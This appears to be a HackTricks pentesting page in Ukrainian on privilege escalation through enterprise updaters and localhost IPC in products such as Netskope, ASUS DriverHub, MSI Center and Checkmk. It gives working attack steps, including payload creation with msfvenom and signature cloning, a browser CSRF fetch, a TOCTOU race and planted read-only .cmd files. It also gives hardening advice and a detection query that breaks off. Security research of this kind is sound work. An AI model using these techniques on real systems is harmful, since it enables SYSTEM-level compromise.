# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope, ASUS і MSI)

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено клас ланцюжків локального підвищення привілеїв у Windows, виявлених в агентах корпоративних кінцевих пристроїв і програмах оновлення, які надають доступний IPC-інтерфейс і привілейований механізм оновлення. Показовий приклад — Netskope Client для Windows < R129 (CVE-2025-0309), де користувач із низькими привілеями може змусити виконати реєстрацію на сервері під контролем зловмисника, а потім доставити шкідливий MSI, який встановить служба SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна застосувати до подібних продуктів:
- Зловживайте localhost IPC привілейованої служби, щоб примусово виконати повторну реєстрацію або переналаштування на сервер зловмисника.
- Реалізуйте кінцеві точки оновлення виробника, доставте шахрайський Trusted Root CA та вкажіть оновлювачу на шкідливий «підписаний» пакет.
- Обходьте слабкі перевірки підписувача (списки дозволених CN), необов’язкові прапорці digest і поблажливі властивості MSI.
- Якщо IPC «зашифровано», отримайте ключ/IV з ідентифікаторів комп’ютера, доступних для читання всім і збережених у реєстрі.
- Якщо служба обмежує викликачів за шляхом до файлу образу/назвою процесу, впровадьтеся в процес зі списку дозволених або запустіть його призупиненим і завантажте DLL за допомогою мінімальної зміни контексту потоку.

До локальних TCP-служб так само слід застосовувати перевірку ідентифікації та меж обробки вхідних даних, навіть якщо для них потрібен PIN-код або інший обліковий запис програми. Визначте процес і ефективний обліковий запис служби, що відповідають за прослуховування, а потім перевірте точну розгорнуту версію бінарного файла та чи перевіряється довжина полів під контролем викликачів перед копіюванням у буфери фіксованого розміру або використанням для формування команди дочірнього процесу. [Рекомендації Microsoft щодо переповнення буфера](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) пояснюють, чому неконтрольовані зовнішні вхідні дані небезпечні у привілейованому нативному коді. Самі по собі loopback listener, жорстко задані облікові дані чи назва процесу не свідчать про пошкодження пам’яті або виконання коду від імені SYSTEM; доступність, авторизація, шлях виконання коду та засоби пом’якшення ризиків — це окремі умови. Під час звичайного переліку інформації обмежуйтеся пасивними методами, не надсилаючи до робочої служби дані, довжина яких може спричинити збій.

---
## 1) Примусова реєстрація на сервері зловмисника через localhost IPC

Багато агентів постачають користувацький UI-процес, який взаємодіє зі службою SYSTEM через localhost TCP, використовуючи JSON.

Виявлено в Netskope:
- UI: stAgentUI (низький рівень цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Схема експлуатації:
1) Створіть токен реєстрації JWT, чиї claims дають змогу керувати хостом backend (наприклад, AddonUrl). Використайте alg=None, щоб підпис не був потрібен.
2) Надішліть IPC-повідомлення, що викликає команду provisioning, із вашим JWT і назвою tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Служба починає звертатися до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка виклику ґрунтується на шляху/імені, надсилайте запит від allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC керування, доступний через мережу

Ця межа довіри не завжди обмежується localhost. У задокументованому випадку MyReport Updater 2.1.1 служба `LocalSystem` прослуховувала всі інтерфейси й приймала неавтентифікований запит gRPC на зміну конфігурації для reference host, порту та режиму роботи. Для віддаленого варіанта були потрібні і мережевий доступ до listener, і вихідний доступ служби до вибраного reference. Оцінюйте ці умови окремо від того, чи може подальший процес обробки пакета подолати межу запису у файл.<sup>[[16]](#references)</sup>

---
## 2) Перехоплення update channel для виконання коду з правами SYSTEM

Коли клієнт почне взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і спрямуйте його на зловмисний MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON-конфігурацію з дуже коротким інтервалом оновлення, наприклад:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Повертає сертифікат CA у форматі PEM. Служба встановлює його в сховище Trusted Root локального комп’ютера.
3) /v2/checkupdate → Надає метадані, що вказують на шкідливий MSI та підроблену версію.

Обхід поширених перевірок, які трапляються на практиці:
- Список дозволених CN підписувачів: служба може лише перевіряти, чи дорівнює Subject CN значенню “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати leaf-сертифікат із таким CN і підписати MSI.
- Властивість CERT_DIGEST: додайте нешкідливу властивість MSI із назвою CERT_DIGEST. Під час встановлення вона не перевіряється.
- Необов’язкова перевірка digest: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

Результат: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок обходу виправлень: якщо постачальник у відповідь додає до списку дозволених невелику кількість «довірених» доменів замість криптографічної автентифікації джерела оновлень, шукайте редиректори або reverse proxy, що належать постачальнику й усе ще дають змогу спрямовувати трафік. У випадку Netskope подальші відкриті дослідження показали, що список дозволених доменів епохи R129 і далі можна було обійти через `rproxy.goskope.com`, який проксирував вміст Azure App Service під контролем зловмисника. Сприймайте списки дозволених імен хостів як перешкоду, а не як межу довіри.<sup>[[14]](#references)</sup>

Інший тип збою — **самоузгоджені, але неавтентифіковані метадані пакета**. У випадку MyReport посилання під контролем зловмисника надавало змінений архів, тоді як посередник змінював відповіді з MD5 digest і розміром від постачальника до того, як вони доходили до засобу оновлення. Збіг цих значень підтверджував узгодженість відповідей, а не походження від постачальника; колізія MD5 не була потрібна. Можливість вибору каталогу встановлення самим викликачем перетворила привілейоване розпакування на межу запису файлів. Отриманий primitive завантаження DLL описано в розділі [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Підроблення зашифрованих IPC-запитів (якщо підтримується)

Починаючи з R127, Netskope обгортав JSON IPC у поле encryptData, схоже на Base64. Зворотний аналіз показав використання AES із ключем і IV, що формуються зі значень реєстру, доступних будь-якому користувачу:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Зловмисники можуть відтворити шифрування та надсилати коректні зашифровані команди зі стандартного облікового запису користувача.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо агент раптом почав «шифрувати» IPC, шукайте ідентифікатори пристроїв, GUID продукту та ідентифікатори встановлення в HKLM, які можуть використовуватися як матеріал.

---
## 4) Обхід списків дозволених IPC-викликачів (перевірки шляху/назви)

Деякі служби намагаються автентифікувати вузол, визначаючи PID TCP-з’єднання та порівнюючи шлях/назву образу зі списком дозволених бінарних файлів постачальника, розташованих у Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні способи обходу:
- DLL injection в дозволений процес (наприклад, nsdiag.exe) і проксирування IPC зсередини нього.
- Запустити дозволений бінарний файл у призупиненому стані й завантажити вашу proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити правила захисту від підміни, які забезпечує драйвер.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Ін’єкція з урахуванням захисту від підміни: призупинений процес + патч NtContinue

Продукти часто постачаються з драйвером minifilter/OB callbacks (наприклад, Stadrv), який прибирає небезпечні права з дескрипторів захищених процесів:
- Процес: прибирає PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Потік: обмежує права до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний завантажувач у user mode, що дотримується цих обмежень:
1) Викликати CreateProcess для бінарного файлу постачальника з прапорцем CREATE_SUSPENDED.
2) Отримати дескриптори, які ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу та дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви пропатчили код за відомим RIP).
3) Перезаписати ntdll!NtContinue (або інший ранній, гарантовано відображений thunk) невеликим stub-кодом, який викликає LoadLibraryW із шляхом до вашої DLL, а потім переходить назад.
4) Викликати ResumeThread, щоб виконати ваш stub у процесі та завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви його створили самі), політика драйвера дотримується.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Практичні інструменти
- NachoVPN (плагін Netskope) автоматизує створення rogue CA, підписання шкідливого MSI та надає потрібні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — спеціальний IPC-клієнт, що формує довільні IPC-повідомлення (за потреби зашифровані AES) і містить ін’єкцію в призупинений процес, щоб надсилати запити від імені дозволеного бінарного файлу.<sup>[[4]](#references)</sup>

## 7) Швидкий процес первинного аналізу невідомих поверхонь updater/IPC

Якщо ви маєте справу з новим endpoint-агентом або набором утиліт-помічників материнської плати, зазвичай достатньо швидкого процесу, щоб визначити, чи є перед вами перспективна ціль для privesc:<sup>[[6]](#references)</sup>

1) Перелічіть loopback-listener-и та визначте відповідні процеси постачальника:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Перелічіть потенційні іменовані канали:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Зберіть дані маршрутизації з реєстру, які використовують IPC-сервери на основі плагінів:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Спочатку витягніть назви endpoint-ів, ключі JSON і command ID із клієнта користувацького режиму. Упаковані фронтенди Electron/.NET часто leak-ять повну схему:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Патерни, яким варто надати пріоритет:
- `CryptQueryObject`/розбір сертифікатів без `WinVerifyTrust` зазвичай означає, що «сертифікат існує» вважалося еквівалентом «сертифікат довірений», що дає змогу клонувати сертифікати або застосовувати інші трюки з підробленими підписантами.
- Перевірки підрядка/суфікса для `Origin`, `Referer`, URL завантажень, імен процесів або CN підписанта — це не автентифікація. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою контрольованих атакувальником доменів-двійників.
- Якщо GUI з низькими привілеями вирішує, що «файл довірений», а SYSTEM broker лише використовує цей результат, патчинг або повторна реалізація клієнтської DLL/JS часто повністю обходить цю межу (розділена валідація у стилі Razer).
- Якщо broker копіює payload у `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє або запускає його з цього шляху, одразу перевірте наявність вікон заміни TOCTOU, а також сусідніх модулів плагінів, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю named pipe PipeViewer — швидкий спосіб виявити слабкі DACL і доступні віддалено pipe, перш ніж детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує викликачів лише за PID, шляхом до образу або ім’ям процесу, вважайте це радше перешкодою, а не межею: часто достатньо впровадитися в легітимний клієнт або встановити з’єднання з процесу зі списку дозволених, щоб пройти перевірки сервера. Для named pipe [ця сторінка про імперсонацію клієнта та зловживання pipe](named-pipe-client-impersonation.md) докладніше описує цей примітив.

Для привілейованого **broker очищення або відновлення** перевірте межу довіри до шляхів, а також ACL pipe. Користувач із нижчими привілеями може мати змогу вибрати місце відновлення або перейменувати проміжний артефакт резервної копії у спільній директорії, навіть якщо виконуваний файл служби та її директорія встановлення захищені. Окремо перевірте, чи може викликач звернутися до команди відновлення, змінити конкретний проміжний файл або його ім’я, чи працює broker від імені користувача з вищими привілеями та чи справді операція відновлення записує дані у вибраний захищений шлях. Доступна для запису проміжна директорія або доступна для читання pipe самі по собі не доводять можливість довільного привілейованого запису; відповідність призначень шляхів і поведінку служби потрібно перевірити під час аналізу коду або контрольованого тестування. Не запускайте невідому команду очищення під час пасивної розвідки, оскільки вона може видалити файли користувача.

---
## 8) Модульні broker надбудов, що автентифікуються лише за підписами постачальника (патерн Lenovo Vantage)

Новий варіант, на який варто звернути увагу, — це **RPC broker із підписаним клієнтом**: настільний процес Lenovo з низькими привілеями спілкується зі службою SYSTEM, а служба спрямовує JSON-команди до набору надбудов, описаних у XML, у `%ProgramData%`. Щойно вдається виконати код **усередині будь-якого прийнятого підписаного клієнта**, кожен контракт `runas="system"` стає частиною вашої поверхні атаки.<sup>[[15]](#references)</sup>

Високоцінні примітиви, виявлені під час досліджень Lenovo Vantage:
- **Довіра до викликача через підпис постачальника**: дослідники отримали автентифікований контекст, скопіювавши підписаний Lenovo EXE у директорію з доступом на запис і виконавши DLL side-load (`profapi.dll`), завдяки чому довільний код запускався всередині клієнта, якому служба вже довіряла.
- **Виявлення поверхні атаки на основі маніфестів**: надбудови оголошено в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів виконуються від імені `SYSTEM`, тож перелік цих маніфестів часто швидше виявляє справжні привілейовані дієслова, ніж реверсинг самого broker.
- **Помилки окремих команд за автентифікованим каналом**: опубліковані дослідження показали, що після проникнення у довірений клієнт можна виявити обхід каталогів і race conditions у командах оновлення/встановлення, зловживання raw SQL у привілейованих базах даних налаштувань, а також перевірки шляхів реєстру на основі підрядків, які давали змогу записувати дані за межами передбаченого hive.

Корисна розвідка цілі:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Практичний висновок: коли helper suite надає broker, який спочатку автентифікує **процес-викликач**, а вже потім виконує десятки команд plugin/add-in, не зупиняйтеся після обходу початкової перевірки довіри. Вивантажте таблицю manifest/contract і окремо fuzz-те кожну команду з високими привілеями; автентифікований канал зазвичай приховує кілька помилок другого етапу.

---
## 1) CSRF із браузера на localhost проти привілейованих HTTP API (ASUS DriverHub)

DriverHub постачається із HTTP-сервісом у режимі користувача (ADU.exe) на 127.0.0.1:53000, який очікує браузерні запити з https://driverhub.asus.com. Фільтр origin просто виконує `string_contains(".asus.com")` для заголовка Origin і URL завантаження, доступних через `/asus/v1.0/*`. Тому будь-який контрольований зловмисником хост, наприклад `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати запити, що змінюють стан, із JavaScript.<sup>[[6]](#references)</sup> Додаткові способи обходу див. у матеріалі [основи CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Практичний сценарій:
1) Зареєструйте домен, у якому є `.asus.com`, і розмістіть на ньому шкідливу вебсторінку.
2) Використайте `fetch` або XHR, щоб викликати привілейовану кінцеву точку (наприклад, `Reboot` або `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть тіло JSON, якого очікує обробник, — упакований frontend JS показує схему нижче.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Навіть наведений нижче CLI PowerShell успішно виконується, якщо підмінити заголовок Origin на довірене значення:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Будь-яке відвідування сайту зловмисника в браузері стає локальним CSRF в один клік (або без кліків через `onload`), що запускає допоміжний процес із правами SYSTEM.

---
## 2) Ненадійна перевірка code-signing і клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в JSON-тілі, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка URL завантаження повторно використовує ту саму логіку пошуку підрядка, тому `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, чи PE містить підпис і чи відповідає рядок Subject ASUS, а потім запускає його — без `WinVerifyTrust` і без перевірки ланцюжка сертифікатів.

Щоб використати цей процес:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підпис ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на схожому домені `.asus.com` і запустіть UpdateApp через описаний вище browser CSRF.

Оскільки і фільтри Origin та URL використовують пошук підрядка, а перевірка підпису лише порівнює рядки, DriverHub завантажує та виконує бінарний файл зловмисника з підвищеними привілеями.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у шляхах копіювання/виконання засобу оновлення (MSI Center CMD_AutoUpdateSDK)

SYSTEM-сервіс MSI Center надає TCP-протокол, у якому кожен фрейм має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його обробник:
1) Копіює наданий виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис за допомогою `CS_CommonAPI.EX_CA::Verify` (subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює заплановане завдання, яке запускає тимчасовий файл як SYSTEM з аргументами, контрольованими зловмисником.

Скопійований файл не блокується між перевіркою та `ExecuteTask()`. Зловмисник може:
- Надіслати Frame A із шляхом до легітимного бінарного файла з підписом MSI (це гарантує успішне проходження перевірки підпису та постановку завдання в чергу).
- Влаштувати гонку, надсилаючи повторні повідомлення Frame B із шляхом до шкідливого payload, щоб перезаписати `MSI Center SDK.exe` одразу після завершення перевірки.

Коли планувальник запустить завдання, він виконає перезаписаний payload із правами SYSTEM, хоча перевірив оригінальний файл. Для надійної експлуатації використовують дві goroutine/threads, які безперервно надсилають CMD_AutoUpdateSDK, доки не буде виграно TOCTOU-вікно.<sup>[[6]](#references)</sup>

---
## 2) Зловживання власними IPC і impersonation на рівні SYSTEM (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти фрейму визначають компонент, даючи зловмисникам змогу спрямовувати команди до довільних модулів.
- Plugins можуть визначати власні виконавці завдань. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` **без перевірки підпису** — будь-який локальний користувач може вказати `C:\Users\<user>\Desktop\payload.exe` і гарантовано отримати виконання з правами SYSTEM.
- Sniffing loopback за допомогою Wireshark або інструментування .NET-бінарних файлів у dnSpy швидко виявляє відповідність Component ↔ command; після цього власні клієнти на Go/Python можуть повторно надсилати фрейми.<sup>[[6]](#references)</sup>

### Named pipes і рівні impersonation в Acer Control Centre
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє віддаленим клієнтам підключатися (наприклад, через `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання ID команди `7` разом зі шляхом до файла викликає процедуру запуску процесу в сервісі.
- Бібліотека клієнта серіалізує разом з аргументами байт-термінатор зі значенням 113. Динамічне інструментування за допомогою Frida/`TsDotNetLib` (поради з інструментування див. у [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показує, що native-обробник зіставляє це значення з `SECURITY_IMPERSONATION_LEVEL` і SID цілісності перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) спрямовує виконання в загальну гілку, яка зберігає повний SYSTEM-токен і встановлює SID високого рівня цілісності (`S-1-16-12288`). Отже, запущений бінарний файл працює як SYSTEM без обмежень — як локально, так і між комп’ютерами.
- Поєднайте це з відкритим прапорцем інсталятора (`Setup.exe -nocheck`), щоб встановити ACC навіть на лабораторних VM і перевірити pipe без обладнання виробника.<sup>[[6]](#references)</sup>

Ці IPC-вразливості показують, чому localhost-сервіси мають забезпечувати взаємну автентифікацію (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, фільтрацію токенів) і чому допоміжні засоби «запуску довільного бінарного файла» в кожному модулі мають використовувати однакові перевірки підпису.

---
## 3) COM/IPC «elevator»-помічники зі слабкою перевіркою в user-mode (Razer Synapse 4)

У Razer Synapse 4 з’явився ще один корисний приклад із цієї категорії: користувач із низькими привілеями може попросити COM-помічник запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делегується DLL у user-mode (`simple_service.dll`), а не надійно забезпечується всередині привілейованого компонента.

Зафіксований шлях експлуатації:
- Створити екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викликати `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити запуск із підвищеними привілеями.
- У публічному PoC перевірку PE-підпису в `simple_service.dll` вимкнено патчем перед надсиланням запиту, що дає змогу запустити довільний виконуваний файл, вибраний зловмисником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Загальний висновок: під час аналізу «helper»-пакетів не обмежуйтеся localhost TCP або named pipes. Перевіряйте COM-класи з назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з’ясовуйте, чи привілейована служба сама перевіряє цільовий бінарний файл, чи лише довіряє результату, обчисленому патчабельною клієнтською DLL у user-mode. Ця схема застосовна не лише до Razer: будь-яка розділена архітектура, у якій broker із високими привілеями використовує рішення allow/deny від сторони з низькими привілеями, може бути поверхнею для privesc.


---
## Виконання передбачуваного тимчасового скрипту під час відновлення MSI (Checkmk Agent / CVE-2024-0670)

Деякі агенти Windows досі реалізують привілейовані дії, записуючи тимчасовий `.cmd` у `C:\Windows\Temp` і виконуючи його від імені `SYSTEM`. Якщо ім’я файлу передбачуване, а служба не створює безпечно нові файли замість уже наявних, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл і позначити його як **read-only**, змусивши привілейований процес виконати контрольований зловмисником вміст замість власного скрипту.

Спостерігалося у вразливих збірках Checkmk Agent:
- шаблон тимчасового файлу: `cmk_all_<PID>_1.cmd`
- уражені гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: **відновлення** MSI кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний порядок дій:
1. Оцініть реалістичний діапазон PID за поточними ідентифікаторами процесів або PID запущеного агента.
2. Запишіть короткий **ASCII** payload `.cmd` (`Set-Content -Encoding Ascii` або перенаправлення в `cmd.exe`; не використовуйте вивід PowerShell у UTF-16 для batch-файлів).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` для всього можливого діапазону та позначте кожен файл як read-only.
4. Запустіть відновлення кешованого MSI, щоб привілейована служба спробувала повторно створити тимчасовий скрипт, а потім виконала його.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте кешований MSI-файл із випадковою назвою в `C:\Windows\Installer` із назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Операційні примітки:
- `qwinsta` корисна, коли `msiexec /fa` не працює з неінтерактивної оболонки WinRM і потрібно з’ясувати, чи наявний сеанс робочого стола або від’єднаний сеанс може коректно запустити відновлення.<sup>[[7]](#references)</sup>
- Цей сценарій поширюється на інші агенти кінцевих точок і засоби оновлення, які **розміщують тимчасові скрипти в доступних для запису всім місцях, а згодом виконують їх від імені SYSTEM**. Перевіряйте передбачувані імена, відсутність семантики ексклюзивного створення та можливість запуску процесів відновлення/оновлення на вимогу.

### Відновлення інтерактивного інсталятора та привілейована консоль

PDF24 Creator 11.15.1 демонструє окремий ризик відновлення MSI: під час відновлення custom action для встановлення принтера може запустити видиму консоль із правами SYSTEM. У версії 11.15.2 постачальник змінив інсталятор MSI, щоб усунути цю поведінку. Старіша версія продукту — лише привід для первинної перевірки. Перевірте зареєстрований або доступний пакет MSI, чи може цей користувач запустити відновлення, чи наявні вразливий custom action і затримка запису до файлу журналу, а також чи може інтерактивний робочий стіл відкрити доступ до консолі. Для зазначеної затримки використовувався oplock на `faxPrnInst.log`; звичайного права на запис до файлу недостатньо. Неінтерактивна оболонка, недоступний пакет або виправлений інсталятор можуть перервати цей ланцюжок. Ця проблема не залежить від `AlwaysInstallElevated` і відрізняється від підміни передбачуваного тимчасового скрипту.

---
## Віддалене перехоплення ланцюжка постачання через слабку перевірку засобу оновлення (WinGUp / Notepad++)

У період із червня до грудня 2025 року зловмисники, які скомпрометували інфраструктуру хостингу за процесом оновлення Notepad++, вибірково надсилали вибраним жертвам шкідливі маніфести. Старі засоби оновлення на базі WinGUp не повністю перевіряли автентичність оновлень, тож зловмисна відповідь XML могла перенаправити клієнтів на URL-адреси під контролем зловмисників. Оскільки клієнт приймав вміст HTTPS, не вимагаючи водночас довіреного ланцюжка сертифікатів і дійсного підпису PE завантаженого інсталятора, жертви завантажували й запускали троянізований NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний процес (локальний експлойт не потрібен):
1. **Перехоплення інфраструктури**: скомпрометувати CDN/хостинг і відповідати на запити оновлень метаданими зловмисника, що вказують на шкідливу URL-адресу завантаження.
2. **Троянізований NSIS**: інсталятор завантажує/виконує корисне навантаження та зловживає двома ланцюжками виконання:
   - **Власний підписаний бінарний файл + sideload**: додати підписаний Bitdefender `BluetoothService.exe` і розмістити шкідливий `log.dll` у шляху пошуку. Коли запускається підписаний бінарний файл, Windows виконує sideload `log.dll`, який розшифровує та рефлексивно завантажує бекдор Chrysalis (захищений Warbird і використовує хешування API для ускладнення статичного виявлення).
   - **Ін’єкція shellcode через скрипт**: NSIS виконує скомпільований Lua-скрипт, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для ін’єкції shellcode та розгортання Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Рекомендації щодо посилення захисту/виявлення для будь-якого засобу автоматичного оновлення:
- Вимагайте **перевірки сертифіката й підпису** завантаженого інсталятора (закріплюйте сертифікат підписувача постачальника, відхиляйте невідповідний CN/ланцюжок) і підписуйте сам маніфест оновлення (наприклад, за допомогою XMLDSig). Блокуйте перенаправлення, задані в маніфесті, якщо їх не перевірено.
- Розглядайте **sideload власного підписаного бінарного файла** як напрям виявлення після завантаження: сповіщайте, коли підписаний EXE постачальника завантажує DLL з іменем поза канонічним шляхом встановлення (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли засіб оновлення розміщує/запускає з тимчасової теки інсталятори з підписами не від постачальника.
- Відстежуйте **артефакти, специфічні для шкідливого ПЗ**, які спостерігалися в цьому ланцюжку (корисні як загальні точки пошуку): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%` і етапи ін’єкції shellcode, керовані Lua.
- Notepad++ посилила захист WinGUp у версії v8.8.9 і новіших: тепер повернутий XML підписується (XMLDSig), а новіші збірки вимагають перевірки сертифіката й підпису завантаженого інсталятора, а не покладаються лише на транспорт.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload <code>log.dll</code> підписаним Bitdefender EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
